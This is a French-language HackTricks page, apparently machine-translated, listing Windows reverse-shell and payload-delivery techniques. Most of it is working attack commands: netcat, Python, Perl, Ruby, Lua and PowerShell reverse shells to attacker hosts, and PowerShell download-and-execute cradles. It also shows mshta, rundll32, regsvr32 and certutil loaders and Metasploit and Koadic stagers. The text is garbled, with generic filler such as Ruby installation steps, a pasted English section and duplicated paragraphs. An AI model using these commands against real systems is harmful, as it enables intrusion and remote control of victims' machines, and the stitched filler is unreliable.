# Shells - Windows

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? Ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof est la plateforme des primes de bugs cryptographiques.**

**Obtenez des récompenses sans délai**\
Les primes HackenProof ne sont lancées que lorsque les clients déposent le budget de récompense. Vous recevrez la récompense après la vérification du bug.

**Acquérez de l'expérience en pentesting web3**\
Les protocoles blockchain et les contrats intelligents sont le nouvel Internet ! Maîtrisez la sécurité web3 dès ses débuts.

**Devenez la légende du pirate web3**\
Gagnez des points de réputation avec chaque bug vérifié et conquérez le sommet du classement hebdomadaire.

[**Inscrivez-vous sur HackenProof**](https://hackenproof.com/register) et commencez à gagner grâce à vos piratages !

{% embed url="https://hackenproof.com/register" %}

## Lolbas

La page [lolbas-project.github.io](https://lolbas-project.github.io/) est pour Windows ce que [https://gtfobins.github.io/](https://gtfobins.github.io/) est pour Linux.\
Évidemment, **il n'y a pas de fichiers SUID ou de privilèges sudo sous Windows**, mais il est utile de savoir **comment** certains **binaires** peuvent être (mal) utilisés pour effectuer des actions inattendues comme **exécuter du code arbitraire**.

## NC
```bash
nc.exe -e cmd.exe <Attacker_IP> <PORT>
```
## SBD

**sbd** est un clone de Netcat, conçu pour être portable et offrir un cryptage solide. Il fonctionne sur les systèmes d'exploitation de type Unix et sur Microsoft Win32. sbd propose un cryptage AES-CBC-128 + HMAC-SHA1 (par Christophe Devine), l'exécution de programmes (option -e), le choix du port source, la reconnexion continue avec délai, et d'autres fonctionnalités intéressantes. sbd ne prend en charge que la communication TCP/IP. sbd.exe (faisant partie de la distribution Kali Linux : /usr/share/windows-resources/sbd/sbd.exe) peut être téléchargé sur une machine Windows en tant qu'alternative à Netcat.

## Python
```bash
#Windows
C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.11.0.37', 4444)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
```
Perl est un langage de script polyvalent et puissant qui peut être utilisé pour créer des shells sur des systèmes Windows. Il offre de nombreuses fonctionnalités utiles pour les hackers, telles que la manipulation de fichiers, l'exécution de commandes système et la communication avec des serveurs distants.

Pour créer un shell Perl sur un système Windows, vous pouvez utiliser le module `Net::Telnet` qui permet d'établir une connexion à distance avec un serveur. Vous pouvez également utiliser le module `Win32::Console` pour manipuler la console Windows et exécuter des commandes système.

Une fois que vous avez établi une connexion à distance avec un serveur, vous pouvez exécuter des commandes système en utilisant la fonction `cmd` de Perl. Par exemple, vous pouvez exécuter la commande `dir` pour afficher le contenu d'un répertoire ou la commande `ipconfig` pour afficher les informations réseau.

Perl offre également des fonctionnalités pour la manipulation de fichiers, telles que la lecture, l'écriture et la suppression de fichiers. Vous pouvez utiliser les fonctions `open`, `read`, `write` et `unlink` pour effectuer ces opérations.

En résumé, Perl est un langage de script puissant qui peut être utilisé pour créer des shells sur des systèmes Windows. Il offre de nombreuses fonctionnalités utiles pour les hackers, telles que la manipulation de fichiers, l'exécution de commandes système et la communication avec des serveurs distants.
```bash
perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
## Ruby

Ruby est un langage de programmation dynamique et orienté objet qui est souvent utilisé pour le développement web. Il est connu pour sa syntaxe élégante et sa facilité d'utilisation. Ruby offre une grande variété de fonctionnalités et de bibliothèques qui peuvent être utilisées pour créer des scripts et des applications puissantes.

### Installation de Ruby

Pour commencer à utiliser Ruby, vous devez d'abord l'installer sur votre système. Voici les étapes pour installer Ruby sur Windows :

1. Téléchargez le programme d'installation Ruby pour Windows à partir du site officiel de Ruby (https://www.ruby-lang.org/en/downloads/).
2. Exécutez le programme d'installation et suivez les instructions à l'écran.
3. Sélectionnez le répertoire d'installation de Ruby (par défaut, il est recommandé de le laisser tel quel).
4. Cochez la case "Add Ruby executables to your PATH" pour ajouter Ruby à votre variable d'environnement PATH.
5. Cliquez sur le bouton "Install" pour lancer l'installation de Ruby.
6. Une fois l'installation terminée, ouvrez une nouvelle fenêtre de terminal et exécutez la commande `ruby -v` pour vérifier que Ruby a été installé avec succès.

### Utilisation de Ruby

Ruby est un langage de script interprété, ce qui signifie que vous pouvez exécuter du code Ruby directement à partir d'un fichier texte. Voici comment créer et exécuter un script Ruby :

1. Ouvrez un éditeur de texte et créez un nouveau fichier avec l'extension `.rb` (par exemple, `mon_script.rb`).
2. Ajoutez votre code Ruby dans le fichier. Par exemple, vous pouvez écrire `puts "Bonjour, monde !"` pour afficher le message "Bonjour, monde !" à l'écran.
3. Enregistrez le fichier et fermez l'éditeur de texte.
4. Ouvrez une fenêtre de terminal et naviguez jusqu'au répertoire où vous avez enregistré votre fichier Ruby.
5. Exécutez la commande `ruby mon_script.rb` pour exécuter le script Ruby. Vous devriez voir le message "Bonjour, monde !" s'afficher à l'écran.

### Ressources supplémentaires

Ruby dispose d'une vaste communauté de développeurs qui partagent leurs connaissances et leurs ressources en ligne. Voici quelques ressources supplémentaires pour en savoir plus sur Ruby :

- [Site officiel de Ruby](https://www.ruby-lang.org/fr/)
- [Ruby-Doc.org](https://ruby-doc.org/)
- [RubyGems.org](https://rubygems.org/)

En utilisant ces ressources, vous pouvez approfondir vos connaissances en Ruby et découvrir de nouvelles bibliothèques et frameworks pour améliorer vos compétences en développement.
```bash
#Windows
ruby -rsocket -e 'c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
Lua est un langage de programmation léger, extensible et puissant. Il est souvent utilisé dans le développement de jeux vidéo et d'applications embarquées. Lua est facile à apprendre et à intégrer dans d'autres langages, ce qui en fait un choix populaire parmi les développeurs. Il est également connu pour sa flexibilité et sa capacité à être utilisé comme langage de script. Lua offre une syntaxe simple et concise, ce qui facilite la lecture et la compréhension du code. Il est compatible avec de nombreuses plates-formes, y compris Windows.
```bash
lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```
## OpenSSH

Attaquant (Kali)
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
```
# Shells Windows

## Introduction

In the context of penetration testing, a shell is a command-line interface that allows an attacker to interact with a compromised system. In this section, we will explore various methods to obtain a shell on Windows systems.

## Netcat

Netcat is a versatile networking utility that can be used to establish a reverse shell on a Windows machine. The basic idea is to listen for incoming connections on the attacker's machine and redirect the shell to that machine.

To set up a reverse shell using Netcat, follow these steps:

1. On the attacker's machine, open a terminal and start listening for incoming connections:

   ```bash
   nc -lvp <port>
   ```

2. On the victim's machine, execute the following command to establish a connection with the attacker's machine:

   ```bash
   nc <attacker_ip> <port> -e cmd.exe
   ```

   Replace `<attacker_ip>` with the IP address of the attacker's machine and `<port>` with the desired port number.

3. Once the connection is established, the attacker will have a shell on the victim's machine.

## PowerShell

PowerShell is a powerful scripting language and command-line shell that is built into Windows. It provides a wide range of functionalities and can be used to execute commands on a remote Windows system.

To establish a PowerShell session on a Windows machine, follow these steps:

1. On the attacker's machine, open a terminal and start a listener using the `Invoke-PowerShellTcp` cmdlet:

   ```powershell
   Invoke-PowerShellTcp -Reverse -IPAddress <attacker_ip> -Port <port>
   ```

   Replace `<attacker_ip>` with the IP address of the attacker's machine and `<port>` with the desired port number.

2. On the victim's machine, execute the following command to establish a connection with the attacker's machine:

   ```powershell
   powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient('<attacker_ip>', <port>); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
   ```

   Replace `<attacker_ip>` with the IP address of the attacker's machine and `<port>` with the desired port number.

3. Once the connection is established, the attacker will have a PowerShell session on the victim's machine.

## Conclusion

Obtaining a shell on a Windows system is a crucial step in the penetration testing process. By using tools like Netcat and PowerShell, an attacker can gain control over a compromised system and perform various malicious activities. It is important for security professionals to be aware of these techniques in order to defend against them effectively.
```bash
#Linux
openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>

#Windows
openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
```
## Powershell

Powershell est un puissant langage de script et une interface en ligne de commande développée par Microsoft. Il est principalement utilisé pour l'automatisation des tâches système et l'administration de Windows. Powershell offre une grande variété de fonctionnalités et de commandes qui permettent aux administrateurs système d'effectuer des opérations complexes et de gérer efficacement les systèmes Windows.

### Utilisation de Powershell pour l'exploitation

Powershell peut également être utilisé par les hackers pour l'exploitation des systèmes Windows. Il offre un large éventail de fonctionnalités qui peuvent être utilisées pour exécuter des commandes malveillantes, accéder à des informations sensibles et compromettre la sécurité des systèmes.

#### Exécution de commandes malveillantes

Powershell permet aux hackers d'exécuter des commandes malveillantes sur des systèmes Windows compromis. Ils peuvent utiliser des scripts Powershell pour exécuter des actions telles que l'installation de logiciels malveillants, la suppression de fichiers, la modification des paramètres système, etc.

#### Accès à des informations sensibles

En utilisant Powershell, les hackers peuvent accéder à des informations sensibles stockées sur des systèmes Windows. Ils peuvent extraire des mots de passe, des informations d'identification, des données personnelles, etc. en utilisant des commandes spécifiques de Powershell.

#### Contournement des mesures de sécurité

Powershell offre aux hackers la possibilité de contourner les mesures de sécurité mises en place sur les systèmes Windows. Ils peuvent utiliser des techniques telles que l'obfuscation de code, l'utilisation de scripts malveillants dans des fichiers légitimes, etc. pour éviter la détection par les logiciels antivirus et les outils de sécurité.

### Prévention et détection de l'utilisation malveillante de Powershell

Pour prévenir et détecter l'utilisation malveillante de Powershell, il est recommandé de prendre les mesures suivantes :

- Restreindre l'accès à Powershell en utilisant des stratégies de groupe et des autorisations appropriées.
- Mettre en place des mécanismes de surveillance pour détecter les activités suspectes liées à Powershell.
- Maintenir les systèmes Windows à jour avec les derniers correctifs de sécurité pour réduire les vulnérabilités exploitées par les hackers.
- Sensibiliser les utilisateurs aux risques liés à l'exécution de scripts Powershell provenant de sources non fiables.
- Utiliser des outils de sécurité avancés qui peuvent détecter et bloquer les commandes malveillantes exécutées via Powershell.

En suivant ces mesures de prévention et de détection, il est possible de réduire les risques liés à l'utilisation malveillante de Powershell et de renforcer la sécurité des systèmes Windows.
```bash
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.2.0.5/shell.ps1')|iex"
powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/ipw.ps1')"
Start-Process -NoNewWindow powershell "IEX(New-Object Net.WebClient).downloadString('http://10.222.0.26:8000/ipst.ps1')"
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile
```
Processus effectuant un appel réseau : **powershell.exe**\
Charge utile écrite sur le disque : **NON** (_du moins nulle part où j'ai pu trouver en utilisant procmon !_)
```bash
powershell -exec bypass -f \\webdavserver\folder\payload.ps1
```
Processus effectuant un appel réseau : **svchost.exe**\
Charge utile écrite sur le disque : **Cache local du client WebDAV**

**Ligne de commande :**
```bash
$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
Mshta is a Windows utility that allows you to execute HTML applications (HTAs) using the Microsoft HTML Application Host. HTAs are standalone applications that can be executed directly from the Windows shell without the need for a web browser.

Mshta can be used as a shell for executing malicious code on a target system. It can be leveraged to bypass security measures and execute scripts or commands with elevated privileges.

To use Mshta as a shell, you can create an HTA file containing your malicious code and then execute it using the following command:

```
mshta.exe <path_to_hta_file>
```

Once executed, the HTA file will run and execute the embedded code, allowing you to perform various actions on the target system.

It is important to note that the use of Mshta as a shell may raise suspicion, as it is not a commonly used utility. Therefore, it is crucial to employ obfuscation techniques to hide the malicious code and avoid detection.

For more information on different Powershell shells, refer to the [Powershell Shells](../shells/powershell.md) section at the end of this document.
```bash
mshta vbscript:Close(Execute("GetObject(""script:http://webserver/payload.sct"")"))
```
Processus effectuant un appel réseau : **mshta.exe**\
Charge utile écrite sur le disque : **cache local d'IE**
```bash
mshta http://webserver/payload.hta
```
Processus effectuant un appel réseau : **mshta.exe**\
Charge utile écrite sur le disque : **cache local d'IE**
```bash
mshta \\webdavserver\folder\payload.hta
```
Processus effectuant un appel réseau : **svchost.exe**\
Charge utile écrite sur le disque : **Cache local du client WebDAV**

#### **Exemple de shell inversé hta-psh (utilise hta pour télécharger et exécuter une porte dérobée PS)**
```markup
<scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://119.91.129.12:8080/1.ps1')"</scRipt>
```
**Vous pouvez télécharger et exécuter très facilement un zombie Koadic en utilisant le stager hta**

#### Exemple hta
```markup
<html>
<head>
<HTA:APPLICATION ID="HelloExample">
<script language="jscript">
var c = "cmd.exe /c calc.exe";
new ActiveXObject('WScript.Shell').Run(c);
</script>
</head>
<body>
<script>self.close();</script>
</body>
</html>
```
#### **mshta - sct**

La technique `mshta - sct` est une méthode couramment utilisée pour exécuter du code malveillant sur des systèmes Windows. Elle exploite l'utilitaire `mshta.exe` qui est présent sur tous les systèmes Windows.

L'extension de fichier `.sct` est utilisée pour stocker le code VBScript ou JScript qui sera exécuté par `mshta.exe`. Cette extension permet de contourner les mécanismes de sécurité de Windows, car elle est considérée comme un fichier de script légitime.

Pour exécuter du code malveillant à l'aide de `mshta - sct`, vous devez d'abord créer un fichier `.sct` contenant le code que vous souhaitez exécuter. Ensuite, vous devez utiliser la commande `mshta.exe` pour exécuter ce fichier `.sct`. Le code malveillant sera alors exécuté avec les privilèges de l'utilisateur en cours.

Il est important de noter que l'utilisation de cette technique peut être détectée par les antivirus et les outils de sécurité. Par conséquent, il est recommandé de prendre des mesures supplémentaires pour masquer le code malveillant et éviter la détection.

Voici un exemple de commande pour exécuter un fichier `.sct` malveillant avec `mshta.exe` :

```
mshta.exe "file://C:/path/to/malicious.sct"
```

Assurez-vous de remplacer `C:/path/to/malicious.sct` par le chemin d'accès réel vers votre fichier `.sct` malveillant.

Cette technique peut être utilisée lors d'une attaque de phishing, d'une exploitation de vulnérabilité ou d'une infiltration de système. Il est essentiel de comprendre les risques associés à cette technique et de l'utiliser de manière responsable et légale.
```markup
<?XML version="1.0"?>
<!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:http://webserver/scriplet.sct"")")) -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:C:\local\path\scriptlet.sct"")")) -->
<scriptlet>
<public>
</public>
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</scriptlet>
```
#### **Mshta - Metasploit**

Mshta is a utility in Windows that allows you to execute HTML applications (HTAs). It is often used by attackers to bypass security measures and execute malicious code. Metasploit, a popular penetration testing framework, provides a module called `exploit/windows/browser/mshta` that can be used to exploit this vulnerability.

To use the `mshta` module in Metasploit, follow these steps:

1. Start Metasploit by running the `msfconsole` command.
2. Search for the `mshta` module using the `search` command: `search mshta`.
3. Load the `mshta` module using the `use` command followed by the module name: `use exploit/windows/browser/mshta`.
4. Set the required options for the module. You can view the available options using the `show options` command.
5. Set the payload to be executed using the `set payload` command. For example, you can use the `windows/meterpreter/reverse_tcp` payload.
6. Set any additional options required for the payload, such as the `LHOST` and `LPORT` values.
7. Run the exploit using the `exploit` command.

Once the exploit is successful, you will have a Meterpreter session on the target system, giving you full control over the compromised machine.

It is important to note that using Metasploit for unauthorized access or malicious purposes is illegal and unethical. This information is provided for educational purposes only, to help security professionals understand and defend against potential attacks.
```bash
use exploit/windows/misc/hta_server
msf exploit(windows/misc/hta_server) > set srvhost 192.168.1.109
msf exploit(windows/misc/hta_server) > set lhost 192.168.1.109
msf exploit(windows/misc/hta_server) > exploit
```

```bash
Victim> mshta.exe //192.168.1.109:8080/5EEiDSd70ET0k.hta #The file name is given in the output of metasploit
```
**Détecté par le défenseur**

## **Rundll32**

[**Exemple de DLL hello world**](https://github.com/carterjones/hello-world-dll)
```bash
rundll32 \\webdavserver\folder\payload.dll,entrypoint
```
Processus effectuant un appel réseau : **svchost.exe**\
Charge utile écrite sur le disque : **Cache local du client WebDAV**
```bash
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close();
```
Processus effectuant un appel réseau : **rundll32.exe**\
Charge utile écrite sur le disque : **cache local d'IE**

**Détecté par Defender**

**Rundll32 - sct**
```bash
<?XML version="1.0"?>
<!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:http://webserver/scriplet.sct"")")) -->
<scriptlet>
<public>
</public>
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</scriptlet>
```
#### **Rundll32 - Metasploit**

Rundll32 is a Windows utility that allows the execution of DLL files as if they were executable files. This can be exploited by an attacker to execute malicious code. Metasploit, a popular penetration testing framework, provides a module called `windows/local/hta` that can be used to generate a malicious HTA file. This file can then be executed using Rundll32, allowing the attacker to gain control over the target system.

To use this technique, follow these steps:

1. Generate the malicious HTA file using the `windows/local/hta` module in Metasploit.
2. Transfer the HTA file to the target system.
3. Execute the HTA file using Rundll32 with the following command:

```
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://<attacker_ip>/payload.hta");
```

Replace `<attacker_ip>` with the IP address of the machine running the Metasploit framework.

By executing the HTA file with Rundll32, the attacker can run arbitrary code on the target system and gain control over it. This technique can be used to escalate privileges, install backdoors, or perform other malicious activities. It is important to note that this technique may trigger antivirus alerts, so additional evasion techniques may be necessary to bypass detection.
```bash
use windows/smb/smb_delivery
run
#You will be given the command to run in the victim: rundll32.exe \\10.2.0.5\Iwvc\test.dll,0
```
**Rundll32 - Koadic**

Rundll32 is a Windows utility that allows the execution of DLL files as functions. This can be leveraged by attackers to load malicious DLLs and execute their code. One popular tool that utilizes this technique is Koadic.

Koadic is a post-exploitation RAT (Remote Access Trojan) that provides a command-and-control interface to interact with compromised systems. It uses the rundll32 utility to load its DLL payload and establish a backdoor on the target machine.

To use Koadic, the attacker first needs to generate a malicious DLL payload using the Koadic framework. This payload is then loaded using the rundll32 utility, which executes the code contained within the DLL. Once the payload is executed, the attacker gains remote access to the compromised system and can perform various malicious activities.

Koadic provides a wide range of features, including file system access, keylogging, screenshot capture, and network reconnaissance. It also supports multiple communication channels, such as HTTP, DNS, and ICMP, making it difficult to detect and block.

To prevent attacks utilizing rundll32 and Koadic, it is important to implement strong security measures, such as regularly updating software, using strong passwords, and employing network segmentation. Additionally, monitoring network traffic and using intrusion detection systems can help detect and mitigate such attacks.
```bash
use stager/js/rundll32_js
set SRVHOST 192.168.1.107
set ENDPOINT sales
run
#Koadic will tell you what you need to execute inside the victim, it will be something like:
rundll32.exe javascript:"\..\mshtml, RunHTMLApplication ";x=new%20ActiveXObject("Msxml2.ServerXMLHTTP.6.0");x.open("GET","http://10.2.0.5:9997/ownmG",false);x.send();eval(x.responseText);window.close();
```
## Regsvr32

Regsvr32 est une commande intégrée de Windows qui permet d'enregistrer ou de désenregistrer des bibliothèques de liens dynamiques (DLL) et des contrôles ActiveX dans le registre du système. Cette commande est souvent utilisée par les attaquants pour exécuter du code malveillant sur un système cible.

### Syntaxe

La syntaxe de base de la commande Regsvr32 est la suivante :

```
regsvr32 [/u] <chemin_vers_DLL>
```

- `/u` : option facultative pour désenregistrer la DLL spécifiée.

### Utilisation en tant qu'outil d'attaque

Les attaquants peuvent utiliser Regsvr32 pour exécuter du code malveillant enregistré dans une DLL. Ils peuvent également utiliser cette commande pour charger des bibliothèques tierces malveillantes dans le processus d'un programme légitime.

Pour exécuter du code malveillant à l'aide de Regsvr32, les attaquants peuvent créer une DLL malveillante contenant leur code et l'enregistrer sur le système cible. Ensuite, ils peuvent utiliser la commande Regsvr32 pour charger et exécuter cette DLL.

### Contre-mesures

Pour se protéger contre les attaques utilisant Regsvr32, il est recommandé de suivre les bonnes pratiques de sécurité suivantes :

- Maintenir le système d'exploitation et les logiciels à jour avec les derniers correctifs de sécurité.
- Utiliser un logiciel antivirus et un pare-feu pour détecter et bloquer les fichiers malveillants.
- Limiter les privilèges d'accès des utilisateurs pour réduire les risques d'exécution de code malveillant.
- Surveiller les activités suspectes sur le réseau et les systèmes pour détecter les éventuelles attaques.
- Sensibiliser les utilisateurs aux techniques d'ingénierie sociale et aux risques liés à l'ouverture de fichiers ou de liens provenant de sources non fiables.

En suivant ces mesures de sécurité, vous pouvez réduire les risques d'exploitation de Regsvr32 et protéger votre système contre les attaques.
```bash
regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
```
Processus effectuant un appel réseau : **regsvr32.exe**\
Charge utile écrite sur le disque : **cache local d'IE**
```
regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
```
Processus effectuant un appel réseau : **svchost.exe**\
Charge utile écrite sur le disque : **Cache local du client WebDAV**

**Détecté par Defender**

#### Regsvr32 -sct
```markup
<?XML version="1.0"?>
<!-- regsvr32 /u /n /s /i:http://webserver/regsvr32.sct scrobj.dll -->
<!-- regsvr32 /u /n /s /i:\\webdavserver\folder\regsvr32.sct scrobj.dll -->
<scriptlet>
<registration
progid="PoC"
classid="{10001111-0000-0000-0000-0000FEEDACDC}" >
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</registration>
</scriptlet>
```
#### **Regsvr32 - Metasploit**

Regsvr32 is a Windows command-line utility used to register and unregister DLL files. It can also be used as a technique to execute arbitrary code on a target system. Metasploit, a popular penetration testing framework, provides a module called `regsvr32_command_delivery` that leverages this technique.

The `regsvr32_command_delivery` module generates a malicious DLL file and registers it using the regsvr32 utility. When the DLL is registered, the code within it is executed, allowing the attacker to gain control over the target system.

To use this module, you need to set the `DLL` option to the path of the DLL file you want to generate. You can also set the `CMD` option to specify the command you want to execute on the target system.

Once the options are set, you can run the module using the `exploit` command. Metasploit will generate the malicious DLL file and register it using regsvr32. The specified command will then be executed on the target system.

This technique can be effective for bypassing security measures that may block other methods of code execution. However, it is important to note that it relies on the target system having the regsvr32 utility available and the ability to register DLL files.

#### **Regsvr32 - Metasploit**

Regsvr32 est un utilitaire en ligne de commande de Windows utilisé pour enregistrer et désenregistrer des fichiers DLL. Il peut également être utilisé comme une technique pour exécuter du code arbitraire sur un système cible. Metasploit, un framework populaire de test de pénétration, fournit un module appelé `regsvr32_command_delivery` qui exploite cette technique.

Le module `regsvr32_command_delivery` génère un fichier DLL malveillant et l'enregistre à l'aide de l'utilitaire regsvr32. Lorsque le DLL est enregistré, le code à l'intérieur est exécuté, permettant à l'attaquant de prendre le contrôle du système cible.

Pour utiliser ce module, vous devez définir l'option `DLL` sur le chemin du fichier DLL que vous souhaitez générer. Vous pouvez également définir l'option `CMD` pour spécifier la commande que vous souhaitez exécuter sur le système cible.

Une fois les options définies, vous pouvez exécuter le module à l'aide de la commande `exploit`. Metasploit générera le fichier DLL malveillant et l'enregistrera à l'aide de regsvr32. La commande spécifiée sera ensuite exécutée sur le système cible.

Cette technique peut être efficace pour contourner les mesures de sécurité qui peuvent bloquer d'autres méthodes d'exécution de code. Cependant, il est important de noter qu'elle repose sur le fait que le système cible dispose de l'utilitaire regsvr32 disponible et de la possibilité d'enregistrer des fichiers DLL.
```bash
use multi/script/web_delivery
set target 3
set payload windows/meterpreter/reverse/tcp
set lhost 10.2.0.5
run
#You will be given the command to run in the victim: regsvr32 /s /n /u /i:http://10.2.0.5:8080/82j8mC8JBblt.sct scrobj.dll
```
**Vous pouvez télécharger et exécuter très facilement un zombie Koadic en utilisant le stager regsvr**

## Certutil

Téléchargez un fichier B64dll, décodez-le et exécutez-le.
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll
```
Téléchargez un fichier B64exe, décodez-le et exécutez-le.
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
```
**Détecté par le défenseur**



<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof est le lieu de tous les programmes de primes pour les bugs de crypto.**

**Obtenez des récompenses sans délai**\
